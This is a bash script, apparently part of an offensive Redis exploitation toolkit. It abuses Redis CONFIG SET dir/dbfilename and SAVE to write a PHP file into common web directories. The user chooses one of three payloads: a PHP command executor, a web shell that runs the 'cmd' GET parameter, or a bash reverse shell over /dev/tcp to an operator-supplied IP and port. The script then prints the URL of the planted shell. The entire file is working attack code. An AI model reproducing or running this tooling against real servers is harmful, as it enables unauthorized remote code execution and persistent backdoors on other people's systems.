#!/bin/bash

# Source common functions
source "$(dirname "$0")/common.sh"

# Inject a web shell with user-specified command
function inject_user_shell() {
  echo -e "${BLUE}[*]${NC} Injecting custom web shell..."
  
  # Common web directories to try
  local WEB_DIRS=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/home/www-data" "/var/www/html/uploads")
  local SHELL_FILENAME="shell.php"
  
  echo -e "${YELLOW}Select shell type:${NC}"
  echo "1. Custom command shell"
  echo "2. PHP web shell (cmd parameter)"
  echo "3. Reverse shell"
  read -p "Enter choice (1-3): " shell_choice

  case $shell_choice in
    1)
      echo "Enter the shell command you want to execute:"
      read -p "Command: " SHELL_PAYLOAD
      if [ -z "$SHELL_PAYLOAD" ]; then
        echo -e "${RED}[-]${NC} No payload provided. Exiting."
        return 1
      fi
      SHELL_CONTENT="<?php system('$SHELL_PAYLOAD'); ?>"
      ;;
    2)
      SHELL_CONTENT='<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
      echo -e "${GREEN}[+]${NC} Using web shell with cmd parameter"
      ;;
    3)
      read -p "Enter your IP: " LHOST
      read -p "Enter your port: " LPORT
      if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
        echo -e "${RED}[-]${NC} IP and port required. Exiting."
        return 1
      fi
      SHELL_CONTENT="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>"
      ;;
    *)
      echo -e "${RED}[-]${NC} Invalid choice."
      return 1
      ;;
  esac

  echo -e "${YELLOW}Trying common web directories...${NC}"
  
  for SHELL_DIR in "${WEB_DIRS[@]}"; do
    echo -e "${BLUE}[*]${NC} Trying directory: $SHELL_DIR"
    
    if redis_cmd CONFIG SET dir "$SHELL_DIR" >/dev/null 2>&1; then
      if redis_cmd CONFIG SET dbfilename "$SHELL_FILENAME" >/dev/null 2>&1; then
        if echo -en "$SHELL_CONTENT" | redis_cmd -x SET webshell >/dev/null 2>&1; then
          if redis_cmd SAVE >/dev/null 2>&1; then
            echo -e "${GREEN}[+]${NC} Web shell injected successfully!"
            echo -e "${GREEN}[+]${NC} Directory: $SHELL_DIR"
            echo -e "${GREEN}[+]${NC} Filename: $SHELL_FILENAME"
            echo -e "${GREEN}[+]${NC} Access at: http://$HOST/$SHELL_FILENAME"
            if [ "$shell_choice" = "2" ]; then
              echo -e "${GREEN}[+]${NC} Usage: http://$HOST/$SHELL_FILENAME?cmd=id"
            fi
            return 0
          fi
        fi
      fi
    fi
  done
  
  echo -e "${RED}[-]${NC} Failed to inject web shell in any directory"
  return 1
}